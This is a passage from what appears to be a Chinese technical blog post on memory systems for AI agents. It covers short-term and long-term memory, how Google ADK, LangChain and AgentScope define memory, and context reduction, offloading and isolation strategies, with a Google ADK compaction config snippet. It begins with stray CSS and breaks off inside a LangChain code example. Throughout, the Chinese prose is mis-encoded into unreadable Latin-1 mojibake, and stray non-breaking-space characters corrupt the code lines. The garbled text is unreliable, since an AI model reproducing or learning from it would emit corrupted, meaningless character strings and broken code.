h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½œè€…ï¼šæŸ³éµé£ï¼ˆç¿¼ä¸¥ï¼‰</p>
<h2 data-id="heading-0">å‰è¨€</h2>
<p>éšç€ AI Agent åº”ç”¨çš„å¿«é€Ÿå‘å±•ï¼Œæ™ºèƒ½ä½“éœ€è¦å¤„ç†è¶Šæ¥è¶Šå¤æ‚çš„ä»»åŠ¡å’Œæ›´é•¿çš„å¯¹è¯å†å²ã€‚ç„¶è€Œï¼ŒLLM çš„ä¸Šä¸‹æ–‡çª—å£é™åˆ¶ã€ä¸æ–­å¢é•¿çš„ token æˆæœ¬ï¼Œä»¥åŠå¦‚ä½•è®© AIâ€œè®°ä½â€ç”¨æˆ·åå¥½å’Œå†å²äº¤äº’ï¼Œéƒ½æˆä¸ºäº†æ„å»ºå®ç”¨ AI Agent ç³»ç»Ÿé¢ä¸´çš„æ ¸å¿ƒæŒ‘æˆ˜ã€‚è®°å¿†ç³»ç»Ÿï¼ˆMemory Systemï¼‰æ­£æ˜¯ä¸ºäº†è§£å†³è¿™äº›é—®é¢˜è€Œè¯ç”Ÿçš„å…³é”®æŠ€æœ¯ã€‚</p>
<p>è®°å¿†ç³»ç»Ÿä½¿ AI Agent èƒ½å¤Ÿåƒäººç±»ä¸€æ ·ï¼Œåœ¨å•æ¬¡å¯¹è¯ä¸­ä¿æŒä¸Šä¸‹æ–‡è¿è´¯æ€§ï¼ˆçŸ­æœŸè®°å¿†ï¼‰ï¼ŒåŒæ—¶èƒ½å¤Ÿè·¨ä¼šè¯è®°ä½ç”¨æˆ·åå¥½ã€å†å²äº¤äº’å’Œé¢†åŸŸçŸ¥è¯†ï¼ˆé•¿æœŸè®°å¿†ï¼‰ã€‚è¿™ä¸ä»…æå‡äº†ç”¨æˆ·ä½“éªŒçš„è¿ç»­æ€§å’Œä¸ªæ€§åŒ–ç¨‹åº¦ï¼Œä¹Ÿä¸ºæ„å»ºæ›´æ™ºèƒ½ã€æ›´å®ç”¨çš„ AI åº”ç”¨å¥ å®šäº†åŸºç¡€ã€‚</p>
<h2 data-id="heading-1">Memory åŸºç¡€æ¦‚å¿µ</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e9b9252177814144b867871c1e45a423~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767604866&amp;x-signature=VyLjca2%2BXFFttr7KpUIXWbggdWY%3D" alt="image_1766567507046.png" loading="lazy"/></p>
<h3 data-id="heading-2">1.1 è®°å¿†çš„å®šä¹‰ä¸åˆ†ç±»</h3>
<p>å¯¹äº AI Agent è€Œè¨€ï¼Œè®°å¿†è‡³å…³é‡è¦ï¼Œå› ä¸ºå®ƒä½¿å®ƒä»¬èƒ½å¤Ÿè®°ä½ä¹‹å‰çš„äº’åŠ¨ã€ä»åé¦ˆä¸­å­¦ä¹ ï¼Œå¹¶é€‚åº”ç”¨æˆ·çš„åå¥½ã€‚</p>
<p>å¯¹â€œè®°å¿†â€çš„å®šä¹‰æœ‰ä¸¤ä¸ªå±‚é¢ï¼š</p>
<ul>
<li><strong>ä¼šè¯çº§è®°å¿†ï¼š</strong> ç”¨æˆ·å’Œæ™ºèƒ½ä½“ Agent åœ¨ä¸€ä¸ªä¼šè¯ä¸­çš„å¤šè½®äº¤äº’ï¼ˆuser-query &amp; responseï¼‰</li>
<li><strong>è·¨ä¼šè¯è®°å¿†ï¼š</strong> ä»ç”¨æˆ·å’Œæ™ºèƒ½ä½“ Agent çš„å¤šä¸ªä¼šè¯ä¸­æŠ½å–çš„é€šç”¨ä¿¡æ¯ï¼Œå¯ä»¥è·¨ä¼šè¯è¾…åŠ© Agent æ¨ç†</li>
</ul>
<h3 data-id="heading-3">1.2 å„ Agent æ¡†æ¶çš„å®šä¹‰å·®å¼‚</h3>
<p>å„ä¸ª Agent æ¡†æ¶å¯¹è®°å¿†çš„æ¦‚å¿µå‘½åå„æœ‰ä¸åŒï¼Œä½†å…±åŒçš„æ˜¯éƒ½éµå¾ªä¸Šä¸€èŠ‚ä¸­ä»‹ç»çš„ä¸¤ä¸ªä¸åŒå±‚é¢çš„åˆ’åˆ†ï¼šä¼šè¯çº§å’Œè·¨ä¼šè¯çº§ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c3844bf82fd444909f707b0419ef8ccb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767604866&amp;x-signature=DMqCHXEloIQ%2B%2BsnVmq8nBCNcq1U%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><strong>æ¡†æ¶è¯´æ˜ï¼š</strong></p>
<ul>
<li><strong>Google ADKï¼š</strong> Session è¡¨ç¤ºå•æ¬¡æŒç»­äº¤äº’ï¼›Memory æ˜¯é•¿æœŸçŸ¥è¯†åº“ï¼Œå¯åŒ…å«æ¥è‡ªå¤šæ¬¡å¯¹è¯çš„ä¿¡æ¯</li>
<li><strong>LangChainï¼š</strong> Short-term memory ç”¨äºå•çº¿ç¨‹æˆ–å¯¹è¯ä¸­è®°ä½ä¹‹å‰çš„äº¤äº’ï¼›Long-term memory ä¸å±äºåŸºç¡€æ ¸å¿ƒç»„ä»¶ï¼Œè€Œæ˜¯é«˜é˜¶çš„â€œä¸ªäººçŸ¥è¯†åº“â€å¤–æŒ‚</li>
<li><strong>AgentScopeï¼š</strong> è™½ç„¶å®˜æ–¹æ–‡æ¡£å¼ºè°ƒéœ€æ±‚é©±åŠ¨ï¼Œä½† API å±‚é¢ä»ç„¶æ˜¯ä¸¤ä¸ªç»„ä»¶ï¼ˆmemory å’Œ long_term_memoryï¼‰ï¼ŒåŠŸèƒ½å±‚é¢æœ‰æ˜ç¡®åŒºåˆ†</li>
</ul>
<p>ä¹ æƒ¯ä¸Šï¼Œå¯ä»¥å°†ä¼šè¯çº§åˆ«çš„å†å²æ¶ˆæ¯ç§°ä¸º<strong>çŸ­æœŸè®°å¿†</strong>ï¼ŒæŠŠå¯ä»¥è·¨ä¼šè¯å…±äº«çš„ä¿¡æ¯ç§°ä¸º<strong>é•¿æœŸè®°å¿†</strong>ï¼Œä½†æœ¬è´¨ä¸Šä¸¤è€…å¹¶ä¸æ˜¯é€šè¿‡ç®€å•çš„æ—¶é—´ç»´åº¦è¿›è¡Œçš„åˆ’åˆ†ï¼Œä»å®è·µå±‚é¢ä¸Šä»¥æ˜¯å¦è·¨ Session ä¼šè¯æ¥è¿›è¡ŒåŒºåˆ†ã€‚é•¿æœŸè®°å¿†çš„ä¿¡æ¯ä»çŸ­æœŸè®°å¿†ä¸­æŠ½å–æç‚¼è€Œæ¥ï¼Œæ ¹æ®çŸ­æœŸè®°å¿†ä¸­çš„ä¿¡æ¯å®æ—¶åœ°æ›´æ–°è¿­ä»£ï¼Œè€Œå…¶ä¿¡æ¯åˆä¼šå‚ä¸åˆ°çŸ­æœŸè®°å¿†ä¸­è¾…åŠ©æ¨¡å‹è¿›è¡Œä¸ªæ€§åŒ–æ¨ç†ã€‚</p>
<h2 data-id="heading-4">Agent æ¡†æ¶é›†æˆè®°å¿†ç³»ç»Ÿçš„æ¶æ„</h2>
<p>å„ Agent æ¡†æ¶åœ¨é›†æˆè®°å¿†ç³»ç»Ÿæ—¶ï¼Œè™½ç„¶å®ç°ç»†èŠ‚ä¸åŒï¼Œä½†éƒ½éµå¾ªç›¸ä¼¼çš„æ¶æ„æ¨¡å¼ã€‚ç†è§£è¿™äº›é€šç”¨æ¨¡å¼æœ‰åŠ©äºæ›´å¥½åœ°è®¾è®¡å’Œå®ç°è®°å¿†ç³»ç»Ÿã€‚</p>
<h3 data-id="heading-5">2.1 Agent æ¡†æ¶é›†æˆè®°å¿†çš„é€šç”¨æ¨¡å¼</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/447f848e7d644d85bb307fa067e2e2e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767604866&amp;x-signature=QW5%2B2TuZBEVHmAvVTr6h7wKAgPs%3D" alt="image_1766569316557.png" loading="lazy"/></p>
<p>å„ Agent æ¡†æ¶é›†æˆè®°å¿†ç³»ç»Ÿé€šå¸¸éµå¾ªä»¥ä¸‹é€šç”¨æ¨¡å¼ï¼š</p>
<p><strong>1. Step1ï¼šæ¨ç†å‰åŠ è½½</strong>Â - æ ¹æ®å½“å‰ user-query ä»é•¿æœŸè®°å¿†ä¸­åŠ è½½ç›¸å…³ä¿¡æ¯</p>
<p><strong>2. Step2ï¼šä¸Šä¸‹æ–‡æ³¨å…¥</strong>Â - ä»é•¿æœŸè®°å¿†ä¸­æ£€ç´¢çš„ä¿¡æ¯åŠ å…¥å½“å‰çŸ­æœŸè®°å¿†ä¸­è¾…åŠ©æ¨¡å‹æ¨ç†</p>
<p><strong>3. Step3ï¼šè®°å¿†æ›´æ–°</strong>Â - çŸ­æœŸè®°å¿†åœ¨æ¨ç†å®ŒæˆååŠ å…¥åˆ°é•¿æœŸè®°å¿†ä¸­</p>
<p><strong>4. Step4ï¼šä¿¡æ¯å¤„ç†</strong>Â - é•¿æœŸè®°å¿†æ¨¡å—ä¸­ç»“åˆ LLM+å‘é‡åŒ–æ¨¡å‹è¿›è¡Œä¿¡æ¯æå–å’Œæ£€ç´¢</p>
<h3 data-id="heading-6">2.2 çŸ­æœŸè®°å¿†ï¼ˆSession ä¼šè¯ï¼‰</h3>
<p>çŸ­æœŸè®°å¿†å­˜å‚¨ä¼šè¯ä¸­äº§ç”Ÿçš„å„ç±»æ¶ˆæ¯ï¼ŒåŒ…æ‹¬ç”¨æˆ·è¾“å…¥ã€æ¨¡å‹å›å¤ã€å·¥å…·è°ƒç”¨åŠå…¶ç»“æœç­‰ã€‚è¿™äº›æ¶ˆæ¯ç›´æ¥å‚ä¸æ¨¡å‹æ¨ç†ï¼Œå®æ—¶æ›´æ–°ï¼Œå¹¶å—æ¨¡å‹çš„ maxToken é™åˆ¶ã€‚å½“æ¶ˆæ¯ç´¯ç§¯å¯¼è‡´ä¸Šä¸‹æ–‡çª—å£è¶…å‡ºé™åˆ¶æ—¶ï¼Œéœ€è¦é€šè¿‡ä¸Šä¸‹æ–‡å·¥ç¨‹ç­–ç•¥ï¼ˆå‹ç¼©ã€å¸è½½ã€æ‘˜è¦ç­‰ï¼‰è¿›è¡Œå¤„ç†ï¼Œè¿™ä¹Ÿæ˜¯ä¸Šä¸‹æ–‡å·¥ç¨‹ä¸»è¦å¤„ç†çš„éƒ¨åˆ†ã€‚</p>
<p><strong>æ ¸å¿ƒç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>å­˜å‚¨ä¼šè¯ä¸­çš„æ‰€æœ‰äº¤äº’æ¶ˆæ¯ï¼ˆç”¨æˆ·è¾“å…¥ã€æ¨¡å‹å›å¤ã€å·¥å…·è°ƒç”¨ç­‰ï¼‰</li>
<li>ç›´æ¥å‚ä¸æ¨¡å‹æ¨ç†ï¼Œä½œä¸º LLM çš„è¾“å…¥ä¸Šä¸‹æ–‡</li>
<li>å®æ—¶æ›´æ–°ï¼Œæ¯æ¬¡äº¤äº’éƒ½ä¼šæ–°å¢æ¶ˆæ¯</li>
<li>å—æ¨¡å‹ maxToken é™åˆ¶ï¼Œéœ€è¦ä¸Šä¸‹æ–‡å·¥ç¨‹ç­–ç•¥è¿›è¡Œä¼˜åŒ–</li>
</ul>
<p>å…³äºçŸ­æœŸè®°å¿†çš„ä¸Šä¸‹æ–‡å·¥ç¨‹ç­–ç•¥ï¼ˆå‹ç¼©ã€å¸è½½ã€æ‘˜è¦ç­‰ï¼‰ï¼Œå°†åœ¨ä¸‹ä¸€ç« èŠ‚ä¸­è¯¦ç»†ä»‹ç»ã€‚</p>
<h3 data-id="heading-7">2.3 é•¿æœŸè®°å¿†ï¼ˆè·¨ä¼šè¯ï¼‰</h3>
<p>é•¿æœŸè®°å¿†ä¸çŸ­æœŸè®°å¿†å½¢æˆåŒå‘äº¤äº’ï¼šä¸€æ–¹é¢ï¼Œé•¿æœŸè®°å¿†ä»çŸ­æœŸè®°å¿†ä¸­æå–â€œäº‹å®â€ã€â€œåå¥½â€ã€â€œç»éªŒâ€ç­‰æœ‰æ•ˆä¿¡æ¯è¿›è¡Œå­˜å‚¨ï¼ˆRecordï¼‰ï¼›å¦ä¸€æ–¹é¢ï¼Œé•¿æœŸè®°å¿†ä¸­çš„ä¿¡æ¯ä¼šè¢«æ£€ç´¢å¹¶æ³¨å…¥åˆ°çŸ­æœŸè®°å¿†ä¸­ï¼Œè¾…åŠ©æ¨¡å‹è¿›è¡Œä¸ªæ€§åŒ–æ¨ç†ï¼ˆRetrieveï¼‰ã€‚</p>
<p><strong>ä¸çŸ­æœŸè®°å¿†çš„äº¤äº’ï¼š</strong></p>
<ul>
<li><strong>Recordï¼ˆå†™å…¥ï¼‰ï¼š</strong> ä»çŸ­æœŸè®°å¿†çš„ä¼šè¯æ¶ˆæ¯ä¸­æå–æœ‰æ•ˆä¿¡æ¯ï¼Œé€šè¿‡LLMè¿›è¡Œè¯­ä¹‰ç†è§£å’ŒæŠ½å–ï¼Œå­˜å‚¨åˆ°é•¿æœŸè®°å¿†ä¸­</li>
<li><strong>Retrieveï¼ˆæ£€ç´¢ï¼‰ï¼š</strong> æ ¹æ®å½“å‰ç”¨æˆ·æŸ¥è¯¢ï¼Œä»é•¿æœŸè®°å¿†ä¸­æ£€ç´¢ç›¸å…³ä¿¡æ¯ï¼Œæ³¨å…¥åˆ°çŸ­æœŸè®°å¿†ä¸­ä½œä¸ºä¸Šä¸‹æ–‡ï¼Œè¾…åŠ©æ¨¡å‹æ¨ç†</li>
</ul>
<p><strong>å®è·µä¸­çš„å®ç°æ–¹å¼ï¼š</strong></p>
<p>åœ¨ Agent å¼€å‘å®è·µä¸­ï¼Œé•¿æœŸè®°å¿†é€šå¸¸æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ç¬¬ä¸‰æ–¹ç»„ä»¶ï¼Œå› ä¸ºå…¶å†…éƒ¨æœ‰ç›¸å¯¹æ¯”è¾ƒå¤æ‚çš„æµç¨‹ï¼ˆä¿¡æ¯æå–ã€å‘é‡åŒ–ã€å­˜å‚¨ã€æ£€ç´¢ç­‰ï¼‰ã€‚å¸¸è§çš„é•¿æœŸè®°å¿†ç»„ä»¶åŒ…æ‹¬ Mem0ã€Zepã€Memosã€ReMe ç­‰ï¼Œè¿™äº›ç»„ä»¶æä¾›äº†å®Œæ•´çš„ Record å’Œ Retrieve èƒ½åŠ›ï¼ŒAgent æ¡†æ¶é€šè¿‡ API é›†æˆè¿™äº›ç»„ä»¶ã€‚</p>
<p><strong>ä¿¡æ¯ç»„ç»‡ç»´åº¦ï¼š</strong></p>
<p>ä¸åŒé•¿æœŸè®°å¿†äº§å“åœ¨ä¿¡æ¯ç»„ç»‡ç»´åº¦ä¸Šæœ‰æ‰€å·®å¼‚ï¼šä¸€äº›äº§å“ä¸»è¦å…³æ³¨ä¸ªäººä¿¡æ¯ï¼ˆä¸ªäººè®°å¿†ï¼‰ï¼Œè€Œä¸€äº›äº§å“é™¤äº†æ”¯æŒä¸ªäººè®°å¿†å¤–ï¼Œè¿˜æ”¯æŒå·¥å…·è®°å¿†ã€ä»»åŠ¡è®°å¿†ç­‰æ›´ä¸°å¯Œçš„ç»´åº¦ã€‚</p>
<ol>
<li>
<p><strong>ç”¨æˆ·ç»´åº¦ï¼ˆä¸ªäººè®°å¿†ï¼‰ï¼š</strong> é¢å‘ç”¨æˆ·ç»´åº¦ç»„ç»‡çš„å®æ—¶æ›´æ–°çš„ä¸ªäººçŸ¥è¯†åº“</p>
<ul>
<li>ç”¨æˆ·ç”»åƒåˆ†ææŠ¥å‘Š</li>
<li>ä¸ªæ€§åŒ–æ¨èç³»ç»Ÿï¼Œåƒäººåƒé¢</li>
<li>å¤„ç†å…·ä½“ä»»åŠ¡æ—¶åŠ è½½è‡³çŸ­æœŸè®°å¿†ä¸­</li>
</ul>
</li>
<li>
<p><strong>ä¸šåŠ¡é¢†åŸŸç»´åº¦ï¼š</strong> æ²‰æ·€çš„ç»éªŒï¼ˆåŒ…æ‹¬é¢†åŸŸç»éªŒå’Œå·¥å…·ä½¿ç”¨ç»éªŒï¼‰</p>
<ul>
<li>å¯æ²‰æ·€è‡³é¢†åŸŸçŸ¥è¯†åº“</li>
<li>å¯é€šè¿‡å¼ºåŒ–å­¦ä¹ å¾®è°ƒæ²‰æ·€è‡³æ¨¡å‹</li>
</ul>
</li>
</ol>
<h2 data-id="heading-8">çŸ­æœŸè®°å¿†çš„ä¸Šä¸‹æ–‡å·¥ç¨‹ç­–ç•¥</h2>
<p>çŸ­æœŸè®°å¿†ç›´æ¥å‚ä¸ Agent å’Œ LLM çš„äº¤äº’ï¼Œéšç€å¯¹è¯å†å²å¢é•¿ï¼Œä¸Šä¸‹æ–‡çª—å£ä¼šé¢ä¸´ token é™åˆ¶å’Œæˆæœ¬å‹åŠ›ã€‚ä¸Šä¸‹æ–‡å·¥ç¨‹ç­–ç•¥æ—¨åœ¨é€šè¿‡æ™ºèƒ½åŒ–çš„å‹ç¼©ã€å¸è½½å’Œæ‘˜è¦æŠ€æœ¯ï¼Œåœ¨ä¿æŒä¿¡æ¯å®Œæ•´æ€§çš„åŒæ—¶ï¼Œæœ‰æ•ˆæ§åˆ¶ä¸Šä¸‹æ–‡å¤§å°ã€‚</p>
<p><strong>å¤‡æ³¨ï¼š</strong> éœ€è¦è¯´æ˜çš„æ˜¯ï¼Œå„æ–¹å¯¹ä¸Šä¸‹æ–‡å·¥ç¨‹çš„æ¦‚å¿µå’Œç†è§£å­˜åœ¨äº›è®¸å·®å¼‚ã€‚<strong>ç‹­ä¹‰çš„ä¸Šä¸‹æ–‡å·¥ç¨‹</strong>ç‰¹æŒ‡å¯¹çŸ­æœŸè®°å¿†ï¼ˆä¼šè¯å†å²ï¼‰ä¸­å„ç§å‹ç¼©ã€æ‘˜è¦ã€å¸è½½ç­‰å¤„ç†æœºåˆ¶ï¼Œä¸»è¦è§£å†³ä¸Šä¸‹æ–‡çª—å£é™åˆ¶å’Œ token æˆæœ¬é—®é¢˜ï¼›<strong>å¹¿ä¹‰çš„ä¸Šä¸‹æ–‡å·¥ç¨‹</strong>åˆ™åŒ…æ‹¬æ›´å¹¿æ³›çš„ä¸Šä¸‹æ–‡ä¼˜åŒ–ç­–ç•¥ï¼Œå¦‚éè¿è¡Œæ€çš„æ¨¡å‹é€‰æ‹©ã€Prompt ä¼˜åŒ–å·¥ç¨‹ã€çŸ¥è¯†åº“æ„å»ºã€å·¥å…·é›†æ„å»ºç­‰ï¼Œè¿™äº›éƒ½æ˜¯åœ¨æ¨¡å‹æ¨ç†å‰å¯¹ä¸Šä¸‹æ–‡è¿›è¡Œä¼˜åŒ–çš„æ‰‹æ®µï¼Œä¸”è¿™äº›å› ç´ éƒ½å¯¹æ¨¡å‹æ¨ç†ç»“æœæœ‰é‡è¦å½±å“ã€‚æœ¬ç« èŠ‚ä¸»è¦è®¨è®ºç‹­ä¹‰çš„ä¸Šä¸‹æ–‡å·¥ç¨‹ï¼Œå³é’ˆå¯¹çŸ­æœŸè®°å¿†çš„è¿è¡Œæ—¶å¤„ç†ç­–ç•¥ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/24e5d661c30a4aa1b54d4994cab1befd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767604866&amp;x-signature=LQl99B9L13t11r8RU5SIs1hQn3c%3D" alt="image_1766570688185.png" loading="lazy"/></p>
<h3 data-id="heading-9">3.1 æ ¸å¿ƒç­–ç•¥</h3>
<p>é’ˆå¯¹çŸ­æœŸè®°å¿†çš„ä¸Šä¸‹æ–‡å¤„ç†ï¼Œä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§ç­–ç•¥ï¼š</p>
<h4 data-id="heading-10">ä¸Šä¸‹æ–‡ç¼©å‡ï¼ˆContext Reductionï¼‰</h4>
<p>ä¸Šä¸‹æ–‡ç¼©å‡é€šè¿‡å‡å°‘ä¸Šä¸‹æ–‡ä¸­çš„ä¿¡æ¯é‡æ¥é™ä½ token æ¶ˆè€—ï¼Œä¸»è¦æœ‰ä¸¤ç§æ–¹æ³•ï¼š</p>
<p><strong>1. ä¿ç•™é¢„è§ˆå†…å®¹ï¼š</strong> å¯¹äºå¤§å—å†…å®¹ï¼Œåªä¿ç•™å‰ N ä¸ªå­—ç¬¦æˆ–å…³é”®ç‰‡æ®µä½œä¸ºé¢„è§ˆï¼ŒåŸå§‹å®Œæ•´å†…å®¹è¢«ç§»é™¤</p>
<p><strong>2. æ€»ç»“æ‘˜è¦ï¼š</strong> ä½¿ç”¨ LLM å¯¹æ•´æ®µå†…å®¹è¿›è¡Œæ€»ç»“æ‘˜è¦ï¼Œä¿ç•™å…³é”®ä¿¡æ¯ï¼Œä¸¢å¼ƒç»†èŠ‚</p>
<p>è¿™ä¸¤ç§æ–¹æ³•éƒ½ä¼šå¯¼è‡´ä¿¡æ¯ä¸¢å¤±ï¼Œä½†èƒ½æœ‰æ•ˆå‡å°‘ token æ¶ˆè€—ã€‚</p>
<h4 data-id="heading-11">ä¸Šä¸‹æ–‡å¸è½½ï¼ˆContext Offloadingï¼‰</h4>
<p>ä¸Šä¸‹æ–‡å¸è½½ä¸»è¦è§£å†³è¢«ç¼©å‡çš„å†…å®¹æ˜¯å¦å¯æ¢å¤çš„é—®é¢˜ã€‚å½“å†…å®¹è¢«ç¼©å‡åï¼ŒåŸå§‹å®Œæ•´å†…å®¹è¢«å¸è½½åˆ°å¤–éƒ¨å­˜å‚¨ï¼ˆå¦‚æ–‡ä»¶ç³»ç»Ÿã€æ•°æ®åº“ç­‰ï¼‰ï¼Œæ¶ˆæ¯ä¸­åªä¿ç•™æœ€å°å¿…è¦çš„å¼•ç”¨ï¼ˆå¦‚æ–‡ä»¶è·¯å¾„ã€UUID ç­‰ï¼‰ã€‚å½“éœ€è¦å®Œæ•´å†…å®¹æ—¶ï¼Œå¯ä»¥é€šè¿‡å¼•ç”¨é‡æ–°åŠ è½½ã€‚</p>
<p><strong>ä¼˜åŠ¿</strong>ï¼šä¸Šä¸‹æ–‡æ›´å¹²å‡€ï¼Œå ç”¨æ›´å°ï¼Œä¿¡æ¯ä¸ä¸¢ï¼Œéšå–éšç”¨ã€‚é€‚ç”¨äºç½‘é¡µæœç´¢ç»“æœã€è¶…é•¿å·¥å…·è¾“å‡ºã€ä¸´æ—¶è®¡åˆ’ç­‰å  token è¾ƒå¤šçš„å†…å®¹ã€‚</p>
<h4 data-id="heading-12">ä¸Šä¸‹æ–‡éš”ç¦»ï¼ˆContext Isolationï¼‰</h4>
<p>é€šè¿‡å¤šæ™ºèƒ½ä½“æ¶æ„ï¼Œå°†ä¸Šä¸‹æ–‡æ‹†åˆ†åˆ°ä¸åŒçš„å­æ™ºèƒ½ä½“ä¸­ï¼ˆç±»ä¼¼å•ä½“æ‹†åˆ†ç§°å¤šä¸ªå¾®æœåŠ¡ï¼‰ã€‚ä¸»æ™ºèƒ½ä½“ç¼–å†™ä»»åŠ¡æŒ‡ä»¤ï¼Œå‘é€ç»™å­æ™ºèƒ½ä½“ï¼Œå­æ™ºèƒ½ä½“çš„æ•´ä¸ªä¸Šä¸‹æ–‡ä»…ç”±è¯¥æŒ‡ä»¤ç»„æˆã€‚å­æ™ºèƒ½ä½“å®Œæˆä»»åŠ¡åè¿”å›ç»“æœï¼Œä¸»æ™ºèƒ½ä½“ä¸å…³å¿ƒå­æ™ºèƒ½ä½“å¦‚ä½•æ‰§è¡Œï¼Œåªéœ€è¦ç»“æœã€‚</p>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šä»»åŠ¡æœ‰æ¸…æ™°ç®€çŸ­çš„æŒ‡ä»¤ï¼Œåªæœ‰æœ€ç»ˆè¾“å‡ºæ‰é‡è¦ï¼Œå¦‚ä»£ç åº“ä¸­æœç´¢ç‰¹å®šç‰‡æ®µã€‚</p>
<p><strong>ä¼˜åŠ¿</strong>ï¼šä¸Šä¸‹æ–‡å°ã€å¼€é”€ä½ã€ç®€å•ç›´æ¥ã€‚</p>
<p><strong>ç­–ç•¥é€‰æ‹©åŸåˆ™ï¼š</strong></p>
<p>ä»¥ä¸Šä¸‰ç§ç­–ç•¥ï¼ˆä¸Šä¸‹æ–‡ç¼©å‡ã€ä¸Šä¸‹æ–‡å¸è½½ã€ä¸Šä¸‹æ–‡éš”ç¦»ï¼‰éœ€è¦æ ¹æ®æ•°æ®çš„åˆ†ç±»è¿›è¡Œç»¼åˆå¤„ç†ï¼Œä¸»è¦è€ƒè™‘å› ç´ åŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>æ—¶é—´è¿œè¿‘ï¼š</strong> è¿‘æœŸæ¶ˆæ¯é€šå¸¸æ›´é‡è¦ï¼Œéœ€è¦ä¼˜å…ˆä¿ç•™ï¼›å†å²æ¶ˆæ¯å¯ä»¥ä¼˜å…ˆè¿›è¡Œç¼©å‡æˆ–å¸è½½</li>
<li><strong>æ•°æ®ç±»å‹ï¼š</strong> ä¸åŒç±»å‹çš„æ¶ˆæ¯ï¼ˆç”¨æˆ·è¾“å…¥ã€æ¨¡å‹å›å¤ã€å·¥å…·è°ƒç”¨ç»“æœç­‰ï¼‰é‡è¦æ€§ä¸åŒï¼Œéœ€è¦é‡‡ç”¨ä¸åŒçš„å¤„ç†ç­–ç•¥</li>
<li><strong>ä¿¡æ¯å¯æ¢å¤æ€§ï¼š</strong> å¯¹äºéœ€è¦å®Œæ•´ä¿¡æ¯çš„å†…å®¹ï¼Œåº”ä¼˜å…ˆä½¿ç”¨å¸è½½ç­–ç•¥ï¼›å¯¹äºå¯ä»¥æ¥å—ä¿¡æ¯ä¸¢å¤±çš„å†…å®¹ï¼Œå¯ä»¥ä½¿ç”¨ç¼©å‡ç­–ç•¥</li>
</ul>
<h3 data-id="heading-13">3.2 å„æ¡†æ¶çš„å®ç°æ–¹å¼</h3>
<p>å„æ¡†æ¶ä¸€èˆ¬å†…ç½®ä¸Šä¸‹æ–‡å¤„ç†ç­–ç•¥ï¼Œé€šè¿‡å‚æ•°åŒ–é…ç½®çš„æ–¹å¼æŒ‡å®šå…·ä½“ç­–ç•¥ã€‚</p>
<p><strong>Google ADK</strong></p>
<p>æ„å»º Agent æ—¶é€šè¿‡Â <code>events_compaction_config</code> è®¾ç½®ä¸Šä¸‹æ–‡å¤„ç†ç­–ç•¥ï¼Œå’Œ Session æœ¬èº«çš„æ•°æ®å­˜å‚¨ç‹¬ç«‹ã€‚</p>
<pre><code class="hljs language-ini" lang="ini">fromÂ google.adk.apps.appÂ importÂ App, EventsCompactionConfig
<span class="hljs-attr">app</span> = App(
Â  Â  <span class="hljs-attr">name</span>=<span class="hljs-string">'my-agent'</span>,
Â  Â  <span class="hljs-attr">root_agent</span>=root_agent,
Â  Â  <span class="hljs-attr">events_compaction_config</span>=EventsCompactionConfig(
Â  Â  Â  Â  <span class="hljs-attr">compaction_interval</span>=<span class="hljs-number">3</span>, Â <span class="hljs-comment"># æ¯3æ¬¡æ–°è°ƒç”¨è§¦å‘å‹ç¼©</span>
Â  Â  Â  Â  <span class="hljs-attr">overlap_size</span>=<span class="hljs-number">1</span>Â  Â  Â  Â  Â Â <span class="hljs-comment"># åŒ…å«å‰ä¸€ä¸ªçª—å£çš„æœ€åä¸€æ¬¡è°ƒç”¨</span>
Â  Â  ),
)
</code></pre>
<p><strong>LangChain</strong></p>
<p>æ„å»º Agent æ—¶é€šè¿‡ middleware æœºåˆ¶ä¸­çš„Â <code>SummarizationMiddleware</code> è®¾ç½®ä¸Šä¸‹æ–‡å¤„ç†å‚æ•°ï¼Œä¸çŸ­æœŸè®°å¿†æœ¬èº«çš„æ•°æ®å­˜å‚¨ç‹¬ç«‹ã€‚</p>
<pre><code class="hljs language-ini" lang="ini">fromÂ langchain.agentsÂ importÂ create_agent
fromÂ langchain.agents.middlewareÂ importÂ SummarizationMiddleware
<span class="hljs-attr">agent</span> = create_agent(
